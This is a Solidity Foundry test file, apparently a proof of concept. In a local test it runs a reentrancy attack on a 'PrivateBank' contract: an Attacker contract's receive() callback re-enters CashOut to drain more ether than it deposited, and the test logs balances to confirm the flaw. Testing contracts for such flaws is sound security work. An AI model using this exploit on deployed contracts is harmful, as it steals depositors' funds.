// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol";

contract Attacker {
    PrivateBank public bank;
    uint256 public reentryCount;
    uint256 public constant amount = 1 ether;

    constructor(PrivateBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        bank.Deposit{value: msg.value}();
        bank.CashOut(amount);
    }

    receive() external payable {
        if (reentryCount < 1) {
            reentryCount++;
            bank.CashOut(amount);
        }
    }
}

contract PrivateBankTest is Test {
    Log public transferLog;
    PrivateBank public bank;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    Attacker attackerContract;

    function setUp() public {
        transferLog = new Log();
        bank = new PrivateBank(address(transferLog));
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);
    }

    function testReentrancyAttack() public {
        // Victim deposits funds
        vm.prank(victim);
        bank.Deposit{value: 10 ether}();

        // Launch attack sequence
        vm.startPrank(attacker);
        attackerContract = new Attacker(bank);

        console.log("--- BEFORE-Trigger State ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerDepositBefore = bank.balances(address(attackerContract));
        uint256 victimDepositBefore = bank.balances(victim);
        uint256 attackerContractBalanceBefore = address(attackerContract).balance;
        
        console.log("Bank ETH balance:", bankBalanceBefore);
        console.log("Attacker deposit in bank:", attackerDepositBefore);
        console.log("Victim deposit in bank:", victimDepositBefore);
        console.log("Attacker Contract ETH:", attackerContractBalanceBefore);

        console.log("--- Trigger Attack ---");
        (bool success, ) = address(attackerContract).call{value: 1 ether}(
            abi.encodeWithSelector(Attacker.attack.selector)
        );
        require(success, "Attack failed");
        vm.stopPrank();

        console.log("--- AFTER-Trigger State ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerDepositAfter = bank.balances(address(attackerContract));
        uint256 victimDepositAfter = bank.balances(victim);
        uint256 attackerContractBalanceAfter = address(attackerContract).balance;
        
        console.log("Bank ETH balance:", bankBalanceAfter);
        console.log("Attacker deposit in bank:", attackerDepositAfter);
        console.log("Victim deposit in bank:", victimDepositAfter);
        console.log("Attacker Contract ETH:", attackerContractBalanceAfter);

        // Calculate state diffs
        uint256 bankBalanceDiff = bankBalanceBefore - bankBalanceAfter;
        uint256 attackerEthGain = attackerContractBalanceAfter - attackerContractBalanceBefore;
        uint256 victimDepositDiff = victimDepositBefore - victimDepositAfter;
        uint256 attackerDepositDiff = attackerDepositAfter - attackerDepositBefore;
        
        console.log("Bank Balance Change:", bankBalanceDiff);
        console.log("Attacker ETH Gain:", attackerEthGain);
        console.log("Victim Deposit Change:", victimDepositDiff);
        console.log("Attacker Deposit Change:", attackerDepositDiff);

        // Vulnerability assessment
        bool bankUnderfunded = bankBalanceAfter < victimDepositAfter;
        bool attackerUnexplainedProfit = attackerEthGain + 1 ether > 1.5 ether; // Should gain > deposited amount
        bool reentrancyDetected = bankUnderfunded && attackerUnexplainedProfit;

        if (reentrancyDetected) {
            console.log("Vulnerability Exists: Bank balance dropped below deposits while attacker gained excess ETH");
        } else {
            console.log("Vulnerability not Exist: ETH flows match expected behavior");
        }
    }
}